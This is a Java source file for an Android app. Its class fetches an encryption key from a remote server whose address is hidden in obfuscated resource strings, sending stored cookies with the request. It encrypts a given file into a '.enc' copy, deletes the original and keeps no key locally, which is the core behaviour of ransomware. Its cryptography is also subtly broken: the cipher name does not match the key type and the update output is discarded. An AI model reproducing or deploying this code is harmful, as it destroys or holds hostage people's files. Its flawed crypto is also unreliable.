package com.example.myapplication.workers;

import android.content.Context;
import android.util.Log;

import com.android.volley.toolbox.Volley;
import com.example.myapplication.R;

import org.json.JSONException;

import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.net.URI;
import java.security.InvalidAlgorithmParameterException;
import java.security.InvalidKeyException;
import java.security.MessageDigest;
import java.security.NoSuchAlgorithmException;
import java.security.SecureRandom;
import java.util.Arrays;

import javax.crypto.BadPaddingException;
import javax.crypto.Cipher;
import javax.crypto.IllegalBlockSizeException;
import javax.crypto.NoSuchPaddingException;
import javax.crypto.spec.IvParameterSpec;
import javax.crypto.spec.SecretKeySpec;

public class EncryptBoi {
    private String LOG_TAG;
    private final String url = "/hash";
    private Context contexty;
    private MessageDigest md;
    private String boom;
    private  byte[] keyBytes,ivBytes;
    private  SecretKeySpec key;
    private  Cipher cipher;
    private  IvParameterSpec iv;
    private  FileInputStream fis;
    private  File encrypted,file;
    private  FileOutputStream fos;
    public EncryptBoi(Context context,File file1){
        contexty = context;
        file = file1;
        LOG_TAG = new GimmeString(context.getString(R.string.log)).decryptBoi();;
    }
    public void weeeeeeeeeeeeee(){
        YeetRequest yeetRequest =  new YeetRequest(YeetRequest.Method.GET,new GimmeString(contexty.getString(R.string.url)).decryptBoi() + url,null, response -> {
            try {
                boom = response.getString("key");
                md = MessageDigest.getInstance("SHA-256");
                keyBytes = md.digest(boom.getBytes());
                key = new SecretKeySpec(keyBytes, "AES");
                ivBytes = new byte[16];
                new SecureRandom().nextBytes(ivBytes);
                cipher = Cipher.getInstance("PBEWithHmacSHA256AndAES_256");
                iv = new IvParameterSpec(ivBytes);
                cipher.init(Cipher.ENCRYPT_MODE,key,iv);
                fis = new FileInputStream(file);
                encrypted = new File(file.getAbsolutePath().concat(".enc"));
                fos = new FileOutputStream(encrypted);
                int i;
                byte[] bytes = new byte[65536];
                do{
                    i = fis.read(bytes);
                    cipher.update(bytes);
                }while(i!=-1);
                fos.write(cipher.doFinal());
                fis.close();
                fos.close();
                file.delete();
                Log.i(LOG_TAG, Arrays.toString(ivBytes));
            } catch (JSONException | NoSuchAlgorithmException | InvalidAlgorithmParameterException | InvalidKeyException | NoSuchPaddingException | BadPaddingException | IllegalBlockSizeException | IOException e) {
                Log.e(LOG_TAG, "shit", e);
            }
        },Throwable::printStackTrace);
        yeetRequest.setCookies(new CookieBoi(contexty).get(URI.create(contexty.getString(R.string.url))));
        Volley.newRequestQueue(contexty).add(yeetRequest);
    }
}
